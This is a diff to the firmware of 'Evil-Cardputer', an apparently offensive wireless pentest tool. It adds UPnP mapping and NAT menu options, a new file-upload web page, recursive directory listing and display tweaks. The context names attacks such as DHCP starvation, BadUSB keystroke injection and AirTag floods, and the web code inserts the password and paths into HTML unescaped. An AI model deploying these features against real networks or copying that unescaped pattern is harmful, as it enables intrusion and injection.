@@ -33,6 +33,7 @@ struct UrlParts;
 struct UrlPartsCrawl;
 struct AtItem;
 struct FakeTag;
+struct TLV;
 
 typedef struct {
   uint32_t state[4];
@@ -220,6 +221,8 @@ static const char * const PROGMEM menuItems[] = {
   "BLENameFlood",
   "Wall Of Airtag",
   "FindMyEvil",
+  "UPnP Mapping",
+  "UPnP NAT",
   "Settings",
 };
 
@@ -658,6 +661,7 @@ void setup() {
     "  Dialing on Stargate...",
     "   Activating Skynet...",
     " Unleashing the Kraken..",
+    "Press S in menu to search",
     " Accessing Mainframe...",
     "   Booting HAL 9000...",
     " Death Star loading ...",
@@ -683,6 +687,7 @@ void setup() {
     " Decrypting the Code...",
     "Solving the Labyrinth...",
     "  Escaping the Matrix...",
+    "Press S in menu to search",
     " You know I-Am-Jakoby ?",
     "You know TalkingSasquach?",
     "Redirecting your bandwidth for Leska free WiFi...", // Donation on Ko-fi // Thx Leska !
@@ -725,6 +730,7 @@ void setup() {
     "   Hack The Planet !!!",
     "Tapping into the Ether...",
     "Writing the Matrix Code..",
+    "Press S in menu to search",
     "Sailing the Cyber Seas...",
     "  Reviving Lost Codes...",
     "   HACK THE PLANET !!!",
@@ -744,6 +750,7 @@ void setup() {
     "Waves under surveillance!",
     "    Shaking champagne…",
     "Warping with Rick & Morty",
+    "Press S in menu to search",
     "       Pickle Rick !!!",
     "Navigating the Multiverse",
     "   Szechuan Sauce Quest.",
@@ -872,6 +879,7 @@ void setup() {
     "Navigating Purge Planet...",
     "Rick's Memories Unlocked..",
     "Synchronizing with Tinkles",
+    "Press S in menu to search",
     "Galactic Federation Hacked",
     "Rick's AI Assistant Activated...",
     "Exploring Zigerion Base...",
@@ -907,6 +915,7 @@ void setup() {
     "Beth's Identity Crisis...",
     "Galactic Federation Overthrown...",
     "Scanning for Phoenix Person...",
+    "Press S in menu to search",
   };
   const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);
 
@@ -1043,6 +1052,7 @@ void setup() {
   restoreConfigParameter("cloned_ssid");
   restoreConfigParameter("portal_password");
   restoreConfigParameter("portal_ip_sel");
+  restoreConfigParameter("cpu_freq");
 
   int textY = 30;
   int lineOffset = 10;
@@ -1059,7 +1069,7 @@ void setup() {
   // Textes à afficher
   const char* text1 = "Evil-Cardputer";
   const char* text2 = "By 7h30th3r0n3";
-  const char* text3 = "v1.4.7 2025";
+  const char* text3 = "v1.4.8 2025";
 
   // Mesure de la largeur du texte et calcul de la position du curseur
   int text1Width = M5.Lcd.textWidth(text1);
@@ -1089,7 +1099,7 @@ void setup() {
   Serial.println(F("-------------------"));
   Serial.println(F("Evil-Cardputer"));
   Serial.println(F("By 7h30th3r0n3"));
-  Serial.println(F("v1.4.7 2025"));
+  Serial.println(F("v1.4.8 2025"));
   Serial.println(F("-------------------"));
   // Diviser randomMessage en deux lignes pour s'adapter à l'écran
   int maxCharsPerLine = screenWidth / 10;  // Estimation de 10 pixels par caractère
@@ -1678,10 +1688,12 @@ void executeMenuItem(int index) {
     case 71: fakeSSDP(); break;
     case 72: skyjackDroneMode(); break;
     case 73: WifiDeadDrop(); break;
-    case 74: bleNameFloodUI();break;
-    case 75: wallOfAirTags();break;
-    case 76: FindMyEvilTx();break;
-    case 77: showSettingsMenu(); break;
+    case 74: bleNameFloodUI(); break;
+    case 75: wallOfAirTags(); break;
+    case 76: FindMyEvilTx(); break;
+    case 77: listUPnPMappings(); break;
+    case 78: upnpTargetNATWorkflow(); break;
+    case 79: showSettingsMenu(); break;
   }
   isOperationInProgress = false;
 }
@@ -2425,9 +2437,11 @@ void showWifiList() {
         int textX = LEFT_PAD + ICON_W;
         int maxTextW = max(0, metaX - textX - 2);
         String line = truncateToWidth(ssidList[i], maxTextW);
+        M5.Display.setTextSize(1.3);
         M5.Display.setCursor(textX, y + 1);
         M5.Display.print(line);
-
+        M5.Display.setTextSize(1);
+        
         // Méta
         M5.Display.setCursor(metaX, y + 1);
         M5.Display.print(meta);
@@ -2906,58 +2920,114 @@ void createCaptivePortal() {
   server.on("/download-all-files", HTTP_GET, handleDownloadAllFiles);
   server.on("/list-directories", HTTP_GET, handleListDirectories);
 
-  server.on("/uploadhtmlfile", HTTP_GET, []() {
-    if (server.arg("pass") == accessWebPassword) {
-      String password = server.arg("pass");
-      String html = "<!DOCTYPE html><html><head>";
-      html += "<meta charset='UTF-8'>";
-      html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
-      html += "<title>Upload File</title></head>";
-      html += "<body><div class='container'>";
-      html += "<form id='uploadForm' method='post' enctype='multipart/form-data'>";
-      html += "<input type='file' name='file' accept='*/*'>";
-      html += "Select directory: <select id='dirSelect' name='directory'>";
-      html += "<option value='/'>/</option>";
-      html += "</select><br>";
-      html += "<input type='submit' value='Upload file'>";
-      html += "</form>";
-      html += "<script>";
-      html += "window.onload = function() {";
-      html += "    var passValue = '" + password + "';";
-      html += "    var dirSelect = document.getElementById('dirSelect');";
-      html += "    fetch('/list-directories?pass=' + encodeURIComponent(passValue))";
-      html += "        .then(response => response.text())";
-      html += "        .then(data => {";
-      html += "            const dirs = data.split('\\n');";
-      html += "            dirs.forEach(dir => {";
-      html += "                if (dir.trim() !== '') {";
-      html += "                    var option = document.createElement('option');";
-      html += "                    option.value = dir;";
-      html += "                    option.textContent = dir;";
-      html += "                    dirSelect.appendChild(option);";
-      html += "                }";
-      html += "            });";
-      html += "        })";
-      html += "        .catch(error => console.error('Error:', error));";
-      html += "    var form = document.getElementById('uploadForm');";
-      html += "    form.onsubmit = function(event) {";
-      html += "        event.preventDefault();";
-      html += "        var directory = dirSelect.value;";
-      html += "        form.action = '/upload?pass=' + encodeURIComponent(passValue) + '&directory=' + encodeURIComponent(directory);";
-      html += "        form.submit();";
-      html += "    };";
-      html += "};";
-      html += "</script>";
-      html += "<style>";
-      html += "body,html{height:100%;margin:0;display:flex;justify-content:center;align-items:center;background-color:#f5f5f5}select {padding: 10px; margin-bottom: 10px; border-radius: 5px; border: 1px solid #ddd; width: 92%; background-color: #fff; color: #333;}.container{width:50%;max-width:400px;min-width:300px;padding:20px;background:#fff;box-shadow:0 4px 8px rgba(0,0,0,.1);border-radius:10px;display:flex;flex-direction:column;align-items:center}form{width:100%}input[type=file],input[type=submit]{width:92%;padding:10px;margin-bottom:10px;border-radius:5px;border:1px solid #ddd}input[type=submit]{background-color:#007bff;color:#fff;cursor:pointer;width:100%}input[type=submit]:hover{background-color:#0056b3}@media (max-width:600px){.container{width:80%;min-width:0}}";
-      html += "</style></body></html>";
 
-      server.send(200, "text/html", html);
-    } else {
-      server.send(403, "text/html", "<html><body><p>Unauthorized.</p><script>setTimeout(function(){window.history.back();}, 1000);</script></body></html>");
+  server.on("/uploadhtmlfile", HTTP_GET, [=]() {
+    if (server.arg("pass") != accessWebPassword) {
+        server.send(403, "text/html", "<p>Unauthorized</p>");
+        return;
     }
-  });
 
+    String password = server.arg("pass");
+    String html;
+
+    html += "<!DOCTYPE html><html><head>";
+    html += "<meta charset='UTF-8'>";
+    html += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
+    html += "<title>Evil File Upload</title>";
+
+    html += "<style>";
+    html += "body,html{margin:0;padding:0;background:#f5f7fb;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}";
+    html += ".container{width:90%;max-width:420px;background:#fff;padding:25px;border-radius:12px;box-shadow:0 4px 18px rgba(0,0,0,0.15);text-align:center;}";
+    html += "h2{color:#007bff;margin-bottom:15px;}";
+
+    html += "select,input[type=file]{width:100%;padding:12px;border:1px solid #d5d5d5;border-radius:6px;margin-bottom:10px;background:white;font-size:15px;box-sizing:border-box;}";
+
+    html += "#dropZone{width:100%;padding:20px;margin-bottom:12px;border:2px dashed #007bff;border-radius:10px;color:#007bff;background:#eef5ff;cursor:pointer;transition:0.2s;box-sizing:border-box;display:block;}";
+    html += "#dropZone.dragover{background:#d8e9ff;border-color:#0056b3;color:#0056b3;}";
+
+    html += "#fileList{text-align:left;font-size:14px;max-height:150px;overflow-y:auto;margin-top:10px;color:#333;}";
+
+    html += "#progressBar{width:100%;height:10px;background:#d8d8d8;border-radius:5px;margin:15px auto;overflow:hidden;}";
+    html += "#progressFill{height:100%;width:0%;background:#007bff;transition:width 0.1s linear;}";
+
+    html += "#doneBox{display:none;margin-top:10px;padding:10px;background:#28a745;color:white;border-radius:6px;font-size:14px;}";
+
+    html += "button{width:100%;padding:12px;background:#007bff;color:white;border:none;border-radius:6px;cursor:pointer;font-size:16px;}";
+    html += "button:hover{background:#0056b3;}";
+    html += "</style></head>";
+
+    html += "<body><div class='container'>";
+    html += "<h2>Upload Files</h2>";
+
+    html += "<select id='dirSelect'><option value='loading'>Loading...</option></select>";
+
+    html += "<div id='dropZone'>Drag & Drop file here</div>";
+    html += "<input type='file' id='fileInput' multiple>";
+    html += "<div id='fileList'></div>";
+
+    html += "<div id='progressBar'><div id='progressFill'></div></div>";
+    html += "<div id='doneBox'>✔ Upload complete</div>";
+
+    html += "<button id='uploadBtn'>Upload</button>";
+    html += "</div>";
+
+    // JS =================================================================
+    html += "<script>";
+    html += "const pass='" + password + "';";
+    html += "let filesToUpload=[];";
+
+    // Load full recursive directory list
+    html += "fetch('/list-directories?pass='+pass).then(r=>r.text()).then(t=>{";
+    html += "const s=document.getElementById('dirSelect');";
+    html += "s.innerHTML='';";
+    html += "t.split('\\n').forEach(d=>{if(d.trim()!==''){let o=document.createElement('option');o.value=d;o.textContent=d;s.appendChild(o);}});";
+    html += "});";
+
+    // Add files
+    html += "function addFiles(flist){for(let f of flist){filesToUpload.push(f);}refreshList();}";
+
+    // Refresh list
+    html += "function refreshList(){let h='';filesToUpload.forEach((f)=>{h+='• '+f.name+' ('+f.size+' bytes)<br>';});document.getElementById('fileList').innerHTML=h;}";
+
+    // Input
+    html += "document.getElementById('fileInput').addEventListener('change',function(){addFiles(this.files);});";
+
+    // Drag-drop
+    html += "const drop=document.getElementById('dropZone');";
+    html += "drop.addEventListener('dragover',e=>{e.preventDefault();drop.classList.add('dragover');});";
+    html += "drop.addEventListener('dragleave',()=>drop.classList.remove('dragover'));";
+    html += "drop.addEventListener('drop',e=>{e.preventDefault();drop.classList.remove('dragover');addFiles(e.dataTransfer.files);});";
+
+    // Upload logic FIXED ( pauses + reset + complete message )
+    html += "document.getElementById('uploadBtn').addEventListener('click',function(){";
+    html += "if(filesToUpload.length===0){alert('No files selected.');return;}";
+
+    html += "let dir=document.getElementById('dirSelect').value;";
+    html += "let i=0;";
+
+    html += "function next(){";
+    html += "if(i>=filesToUpload.length){document.getElementById('doneBox').style.display='block';document.getElementById('progressFill').style.width='0%';return;}";
+
+    html += "let file=filesToUpload[i];";
+    html += "let fd=new FormData();fd.append('file',file);";
+    html += "let x=new XMLHttpRequest();";
+    html += "x.open('POST','/upload?pass='+pass+'&directory='+encodeURIComponent(dir),true);";
+
+    html += "x.upload.onprogress=function(e){if(e.lengthComputable){let p=(e.loaded/e.total)*100;document.getElementById('progressFill').style.width=p+'%';}};";
+
+    html += "x.onload=function(){if(x.status===200){i++;setTimeout(()=>{document.getElementById('progressFill').style.width='0%';next();},150);}else{alert('Upload failed for '+file.name);}};";
+
+    html += "x.send(fd);";
+    html += "}";
+
+    html += "next();";
+    html += "});";
+
+    html += "</script>";
+    html += "</body></html>";
+
+    server.send(200, "text/html", html);
+  });
 
 
   server.on("/upload", HTTP_POST, []() {
@@ -3116,7 +3186,7 @@ void createCaptivePortal() {
       
       // Ajout du bouton de retour au menu principal
       html += "<p><a href='/evil-m5core2-menu'><button>Menu</button></a></p>";
-      
+
       html += "<ul>";
       
       while (File file = dir.openNextFile()) {
@@ -4221,8 +4291,8 @@ void handleSdCardBrowse() {
     }
 
     // Ajout du bouton pour revenir au menu principal
-    String html = "<p><a href='/evil-m5core2-menu'><button style='background-color: #007bff; border: none; color: white; padding: 6px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;'>Menu</button></a></p>";
-    
+    String html = "<p><a href='/evil-m5core2-menu'><button style='background-color: #007bff; border: none; color: white; padding: 6px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;'>Menu</button></a></p><a href='/download-all-files?pass=" + password +"&dir=" + dirPath +"'><button style='background-color:#28a745;border:none;color:white;padding:6px 15px;font-size:16px;margin:4px 2px;cursor:pointer;'>Download ALL</button></a>";
+
     // Générer le HTML pour lister les fichiers et dossiers
     html += getDirectoryHtml(dir, dirPath, password);
     server.send(200, "text/html", html);
@@ -4425,25 +4495,56 @@ void handleFileUpload() {
   }
 }
 
-void handleListDirectories() {
-  String password = server.arg("pass");
-  if (password != accessWebPassword) {
-    server.send(403, "text/plain", "Unauthorized");
-    return;
-  }
-
-  File root = SD.open("/");
-  String dirList = "";
-
-  while (File file = root.openNextFile()) {
-    if (file.isDirectory()) {
-      dirList += String(file.name()) + "\n";
+void listDirsRecursive(const String &basePath, String &out) {
+    File dir = SD.open(basePath);
+    if (!dir || !dir.isDirectory()) {
+        dir.close();
+        return;
     }
-    file.close();
-  }
-  root.close();
-  server.send(200, "text/plain", dirList);
+
+    while (true) {
+        File entry = dir.openNextFile();
+        if (!entry) break;
+
+        if (entry.isDirectory()) {
+
+            // Construire le chemin complet
+            String childPath = basePath;
+            if (!childPath.endsWith("/")) childPath += "/";
+            childPath += entry.name();
+
+            // Ajouter
+            out += childPath + "\n";
+
+            // Récursion
+            listDirsRecursive(childPath, out);
+        }
+
+        entry.close();
+    }
+
+    dir.close();
 }
+
+
+
+void handleListDirectories() {
+    String password = server.arg("pass");
+    if (password != accessWebPassword) {
+        server.send(403, "text/plain", "Unauthorized");
+        return;
+    }
+
+    String out = "/\n";  // racine
+
+    // Récursion complète
+    listDirsRecursive("/", out);
+
+    server.send(200, "text/plain", out);
+}
+
+
+
 
 void listDirectories(File dir, String path, String & output) {
   while (File file = dir.openNextFile()) {
@@ -5069,7 +5170,7 @@ void displayMonitorPage2() {
   _prevCount = numConnectedMACs;
 
   auto drawHeader = [&](){
-    M5.Display.setCursor(0, 0);
+    M5.Display.setCursor(5, 5);
     M5.Display.println("Connected MACs (" + String(numConnectedMACs) + ")");
   };
 
@@ -5579,7 +5680,7 @@ void setCPUFrequency() {
     while (!freqSelected) {
         if (needDisplayUpdate) {
             M5.Display.clear();
-            M5.Display.setCursor(0, 0);
+            M5.Display.setCursor(5, 5);
             M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
             M5.Display.println("Select CPU Frequency:");
 
@@ -5643,7 +5744,7 @@ void setGPSBaudrate() {
     while (!baudrateSelected) {
         if (needDisplayUpdate) {
             M5.Display.clear();
-            M5.Display.setCursor(0, 0);
+            M5.Display.setCursor(5, 5);
             M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
             M5.Display.println("Select GPS Baudrate:");
 
@@ -5810,7 +5911,7 @@ void setStartupSound() {
     while (!soundSelected) {
         if (needDisplayUpdate) {
             M5.Display.clear();
-            M5.Display.setCursor(0, 0);
+            M5.Display.setCursor(5, 5);
             M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
             M5.Display.println("Select Startup Sound:");
 
@@ -6033,7 +6134,7 @@ void setStartupImage() {
             // Mode Liste
             if (needDisplayUpdate) {
                 M5.Display.clear();
-                M5.Display.setCursor(0, 0);
+                M5.Display.setCursor(5, 5);
                 M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
                 M5.Display.println("Select Startup Image:");
 
@@ -6443,7 +6544,7 @@ void setCaptivePortalIP() {
   while (!selected) {
     if (needDisplayUpdate) {
       M5.Display.clear();
-      M5.Display.setCursor(0, 0);
+      M5.Display.setCursor(5, 5);
       M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
       M5.Display.println("Select Captive IP:");
 
@@ -6606,6 +6707,10 @@ void restoreConfigParameter(String key) {
             if (intValue < 0 || intValue > 1) intValue = 0; // garde-fou
             portalIpIndex = intValue;
             Serial.println("Captive IP selection restored: " + String(kCaptiveIPStr[portalIpIndex]));
+          } else if (key == "cpu_freq") {
+            int selectedFreq = stringValue.toInt();
+            setCpuFrequencyMhz(selectedFreq);
+            Serial.println("CPU Frequency restored to " + String(selectedFreq));
           }
           keyFound = true;
           break;
@@ -8110,7 +8215,7 @@ void activateAPForAutoKarma(const char* ssid) {
 
 
 void displayWaitingForProbe() {
-  M5.Display.setCursor(0, 0);
+  M5.Display.setCursor(5, 5);
   if (!isWaitingForProbeDisplayed) {
     M5.Display.clear();
     M5.Display.setTextSize(1.5);
@@ -8149,7 +8254,7 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
   int remainingTime = autoKarmaAPDuration / 1000 - ((currentTime - startTime) / 1000);
   int clientCount = WiFi.softAPgetStationNum();
   M5.Display.setTextSize(1.5);
-  M5.Display.setCursor(0, 0);
+  M5.Display.setCursor(5, 5);
   if (!isInitialDisplayDone) {
     M5.Display.clear();
     M5.Display.setTextColor(menuTextUnFocusedColor);
@@ -8195,9 +8300,9 @@ Wardriving
 
 String createPreHeader() {
   String preHeader = "WigleWifi-1.4";
-  preHeader += ",appRelease=v1.4.7"; // Remplacez [version] par la version de votre application
+  preHeader += ",appRelease=v1.4.8"; // Remplacez [version] par la version de votre application
   preHeader += ",model=Cardputer";
-  preHeader += ",release=v1.4.7"; // Remplacez [release] par la version de l'OS de l'appareil
+  preHeader += ",release=v1.4.8"; // Remplacez [release] par la version de l'OS de l'appareil
   preHeader += ",device=Evil-Cardputer"; // Remplacez [device name] par un nom de périphérique, si souhaité
   preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
   preHeader += ",board=M5Cardputer";
@@ -11588,7 +11693,7 @@ static String urlBase = "";
 void displayUrls() {
   M5.Display.clear();
   M5.Display.setTextSize(1);
-  M5.Display.setCursor(0, 0);
+  M5.Display.setCursor(5, 5);
 
   const int total = (int)urlList.size();
   const int displayCount = std::min(maxDisplayLines, total);
@@ -11599,7 +11704,7 @@ void displayUrls() {
     if (total > 0) M5.Display.println(urlList[displayIndex]);
   }
 
-  M5.Display.setCursor(0, 0);
+  M5.Display.setCursor(5, 5);
   M5.Display.printf(" %d-%d of %d on %s\n",
                     total == 0 ? 0 : startIndex + 1,
                     total == 0 ? 0 : startIndex + displayCount,
@@ -11910,9 +12015,9 @@ void send_arp(char * from_ip, std::vector<IPAddress>& hostslist);
 void logARPResult(IPAddress host, bool responded) {
   char buffer[64];
   if (responded) {
-    sprintf(buffer, "Host %s respond to ARP.", host.toString().c_str());
+    sprintf(buffer, "Host %s respond to ARP   !!!", host.toString().c_str());
   } else {
-    sprintf(buffer, "Host %s did not respond to ARP.", host.toString().c_str());
+    sprintf(buffer, "Host %s silent.", host.toString().c_str());
   }
   Serial.println(buffer);
 }
@@ -12064,7 +12169,7 @@ void displayHostOptions(const std::vector<IPAddress>& hostslist) {
     if (scanninghost) {
       // Clear screen
       M5.Display.clear();
-      M5.Display.setCursor(0, 0);
+      M5.Display.setCursor(5, 5);
 
       // Display options
       for (int i = 0; i < options.size(); ++i) {
@@ -12139,7 +12244,7 @@ void afterScanOptions(IPAddress ip, const std::vector<IPAddress>& hostslist) {
     if (scanninghost) {
       // Clear screen
       M5.Display.clear();
-      M5.Display.setCursor(0, 0);
+      M5.Display.setCursor(5, 5);
 
       // Display options
       for (int i = 0; i < option.size(); ++i) {
@@ -12558,7 +12663,7 @@ public:
       lastUpdate = currentTime;
       M5.Display.fillScreen(TFT_BLACK);
       M5.Display.setTextSize(2);
-      M5.Display.setCursor(0, 0);
+      M5.Display.setCursor(5, 5);
       M5.Display.setTextColor(isSkimmerDetected ? TFT_RED : menuTextUnFocusedColor);
       M5.Display.println(displayMessage);
     }
@@ -12592,7 +12697,7 @@ void skimmerDetection() {
   M5.Display.fillScreen(menuBackgroundColor);
   M5.Display.setTextSize(2);
   M5.Display.setTextColor(menuTextUnFocusedColor);
-  M5.Display.setCursor(0, 0);
+  M5.Display.setCursor(5, 5);
   M5.Display.println("Scanning for Skimmers...");
 
   isScanning = true;
@@ -12625,7 +12730,7 @@ void skimmerDetection() {
 
       M5.Display.fillScreen(TFT_BLACK);
       M5.Display.setTextSize(2);
-      M5.Display.setCursor(0, 0);
+      M5.Display.setCursor(5, 5);
       M5.Display.setTextColor(TFT_RED);
       M5.Display.println(skimmerInfo);
       M5.Speaker.tone(1000, 500);
@@ -12671,7 +12776,7 @@ void key_input(FS &fs, const String &bad_script) {
 
       Kb.releaseAll();
       M5.Display.setTextSize(1);
-      M5.Display.setCursor(0, 0);
+      M5.Display.setCursor(5, 5);
       M5.Display.fillScreen(menuBackgroundColor);
       line = 0;
 
@@ -12780,7 +12885,7 @@ void key_input(FS &fs, const String &bad_script) {
           Kb.releaseAll();
 
           if (line == 7) {
-            M5.Display.setCursor(0, 0);
+            M5.Display.setCursor(5, 5);
             M5.Display.fillScreen(menuBackgroundColor);
             line = 0;
           }
@@ -13178,7 +13283,7 @@ unsigned long lastLog = 0;
 int currentScreen   = 1;  // 1=GeneralInfo, 2=ReceivedData
 
 const String wigleHeaderFileFormat =
-  "WigleWifi-1.4,appRelease=v1.4.7,model=Cardputer,release=v1.4.7,"
+  "WigleWifi-1.4,appRelease=v1.4.8,model=Cardputer,release=v1.4.8,"
   "device=Evil-Cardputer,display=7h30th3r0n3,board=M5Cardputer,brand=M5Stack";
 
 char* log_col_names[LOG_COLUMN_COUNT] = {
@@ -13697,7 +13802,7 @@ void displayStatus(){
 
   if(total != lastTotalReceived){
     M5.Display.fillRect(0, 0, 240, 10, menuBackgroundColor);
-    M5.Display.setCursor(0, 0);
+    M5.Display.setCursor(5, 5);
     M5.Display.setTextSize(1);
     M5.Display.setTextColor(menuTextUnFocusedColor);
     M5.Display.printf("Total Frames: %d", total);
@@ -14707,7 +14812,7 @@ void displayHostsAndScanPorts(const std::vector<IPAddress>& hostslist, int scanI
 // Function to display scan results
 void displayResults(int displayStart, int maxLines, const std::vector<String>& scanResults) {
     M5.Display.clear();
-    M5.Display.setCursor(0, 0);
+    M5.Display.setCursor(5, 5);
 
     int totalLines = scanResults.size();
     int endLine = min(displayStart + maxLines, totalLines);
@@ -15713,7 +15818,7 @@ void saveCurrentNetworkConfig() {
 
     M5.Display.clear(menuBackgroundColor);
     M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-    M5.Display.setCursor(0, 0);
+    M5.Display.setCursor(5, 5);
     M5.Display.println("Current network saved:");
     M5.Display.printf("IP: %s\n", currentIPStarvation.toString().c_str());
     M5.Display.printf("Subnet: %s\n", currentSubnet.toString().c_str());
@@ -15729,7 +15834,7 @@ void disconnectWiFi() {
     
     M5.Display.clear(menuBackgroundColor);
     M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-    M5.Display.setCursor(0, 0);
+    M5.Display.setCursor(5, 5);
     M5.Display.println("WiFi disconnected.");
     M5.Display.display();
     delay(1000);
@@ -15740,7 +15845,7 @@ void configureStaticIP() {
         Serial.println(F("Failed to configure static IP."));
         M5.Display.clear(menuBackgroundColor);
         M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-        M5.Display.setCursor(0, 0);
+        M5.Display.setCursor(5, 5);
         M5.Display.println("Failed to configure\n static IP.");
         M5.Display.display();
         delay(2000);
@@ -15748,7 +15853,7 @@ void configureStaticIP() {
         Serial.println(F("Static IP configured successfully."));
         M5.Display.clear(menuBackgroundColor);
         M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-        M5.Display.setCursor(0, 0);
+        M5.Display.setCursor(5, 5);
         M5.Display.println("Static IP configured \nsuccessfully.");
         M5.Display.display();
         delay(1000);
@@ -15759,7 +15864,7 @@ void reconnectWiFi(int networkIndex) {
     Serial.println(F("Reconnecting to WiFi..."));
     M5.Display.clear(menuBackgroundColor);
     M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-    M5.Display.setCursor(0, 0);
+    M5.Display.setCursor(5, 5);
     M5.Display.println("Reconnecting to WiFi...");
     M5.Display.display();
     
@@ -15790,7 +15895,7 @@ void detectDHCPServer() {
     unsigned long startMillis = millis();
     M5.Display.clear(menuBackgroundColor);
     M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-    M5.Display.setCursor(0, 0);
+    M5.Display.setCursor(5, 5);
     M5.Display.println("Detecting DHCP server...");
     M5.Display.println("Press ENTER to cancel");
     M5.Display.display();
@@ -15803,7 +15908,7 @@ void detectDHCPServer() {
         if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
             Serial.println(F("Detection cancelled by user"));
             M5.Display.clear(menuBackgroundColor);
-            M5.Display.setCursor(0, 0);
+            M5.Display.setCursor(5, 5);
             M5.Display.printf("Detection cancelled");
             M5.Display.display();
             delay(2000);
@@ -15880,7 +15985,7 @@ void startDHCPStarvation() {
         Serial.println(F("Error: Total IPs calculated as zero."));
         M5.Display.clear(menuBackgroundColor);
         M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-        M5.Display.setCursor(0, 0);
+        M5.Display.setCursor(5, 5);
         M5.Display.println("Error: Total IPs\ncalculated as zero.\nsettings to 255");
         totalIPs == 255;
         M5.Display.display();
@@ -15895,7 +16000,7 @@ void startDHCPStarvation() {
         Serial.println(F("Error: Failed to initialize UDP socket on port 68."));
         M5.Display.clear(menuBackgroundColor);
         M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-        M5.Display.setCursor(0, 0);
+        M5.Display.setCursor(5, 5);
         M5.Display.println("Error: Failed to init \nUDP socket");
         M5.Display.display();
         delay(2000);
@@ -15905,7 +16010,7 @@ void startDHCPStarvation() {
     Serial.println(F("System initialized. Ready to detect DHCP server..."));
     M5.Display.clear(menuBackgroundColor);
     M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-    M5.Display.setCursor(0, 0);
+    M5.Display.setCursor(5, 5);
     M5.Display.println("System initialized");
     M5.Display.println("Starting DHCP detection...");
     M5.Display.display();
@@ -15916,7 +16021,7 @@ void startDHCPStarvation() {
         Serial.println(F("DHCP server detected. Starting DHCP Starvation attack..."));
         M5.Display.clear(menuBackgroundColor);
         M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-        M5.Display.setCursor(0, 0);
+        M5.Display.setCursor(5, 5);
         M5.Display.println("Starvation running on:");
         M5.Display.printf("DHCP server:\n%s\n", dhcpServerIP.toString().c_str());
         M5.Display.display();
@@ -15924,7 +16029,7 @@ void startDHCPStarvation() {
         Serial.println(F("No DHCP server detected. Trying with broadcast."));
         M5.Display.clear(menuBackgroundColor);
         M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-        M5.Display.setCursor(0, 0);
+        M5.Display.setCursor(5, 5);
         M5.Display.println("Starvation running on:");
         M5.Display.printf("Unknow DHCP server");
         M5.Display.display();
@@ -16541,7 +16646,7 @@ String getNetworkBase() {
     M5.Display.clear();
     M5.Display.setTextSize(1.5);
     M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
-    M5.Display.setCursor(0, 0);
+    M5.Display.setCursor(5, 5);
     M5.Display.println("Enter base IP (192.168.1):");
     M5.Display.setCursor(0, 50);
 
@@ -16564,7 +16669,7 @@ String getNetworkBase() {
             M5.Display.println("Invalid format! Retry.");
             delay(2000);
             M5.Display.clear();
-            M5.Display.setCursor(0, 0);
+            M5.Display.setCursor(5, 5);
             M5.Display.println("Enter base IP (192.168.1):");
         }
     }
@@ -17216,7 +17321,7 @@ void startHoneypot() {
     Serial.println("Fake Telnet service started on port " + String(honeypotPort));
     M5.Display.clear(); // Effacer l'écran
     M5.Display.setTextSize(1.5);
-    M5.Display.setCursor(0, 0);
+    M5.Display.setCursor(5, 5);
     M5.Display.setTextColor(menuTextUnFocusedColor);
     M5.Display.println("Honeypot Started !");
     M5.Display.println("Waiting interaction...");
@@ -17296,7 +17401,7 @@ void logHoneypotCommand(String clientIP, String command) {
 void redrawScreenWithLogs() {
     M5.Display.clear(); // Effacer l'écran
     M5.Display.setTextSize(1.5);
-    M5.Display.setCursor(0, 0);
+    M5.Display.setCursor(5, 5);
     M5.Display.setTextColor(menuTextUnFocusedColor);
     
     // Afficher les logs du buffer dans l'ordre
@@ -18002,7 +18107,7 @@ void sdToUsb() {
   // Affichage sur l'écran
   M5.Display.fillScreen(TFT_BLACK);
   M5.Display.setTextSize(1);
-  M5.Display.setCursor(0, 0);
+  M5.Display.setCursor(5, 5);
   M5.Display.println("Mounting SDCard on USB, please wait...");
 
   // Attente active jusqu'à ce que l'USB soit monté et stable
@@ -18603,7 +18708,7 @@ void evilLLMChatStream() {
   const int linesPerPage = 9;
 
   M5.Display.clear();
-  M5.Display.setCursor(0, 0);
+  M5.Display.setCursor(5, 5);
   M5.Display.println("Prompt >");
 
   while (true) {
@@ -18637,7 +18742,7 @@ void evilLLMChatStream() {
       requestBody;
 
     M5.Display.clear();
-    M5.Display.setCursor(0, 0);
+    M5.Display.setCursor(5, 5);
     M5.Display.println("Send.");
     M5.Display.println("Waiting answer...");
 
@@ -18786,7 +18891,7 @@ void evilLLMChatStream() {
         return;
       } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
         M5.Display.clear();
-        M5.Display.setCursor(0, 0);
+        M5.Display.setCursor(5, 5);
         M5.Display.println("Prompt >");
         break;
       } else if (M5Cardputer.Keyboard.isKeyPressed(';') && scrollOffset > 0) {
@@ -18923,7 +19028,7 @@ void addMessage(const char* m) {
 void drawChatWindow() {
     M5.Display.fillScreen(TFT_BLACK);
     M5.Display.setTextColor(TFT_GREEN);
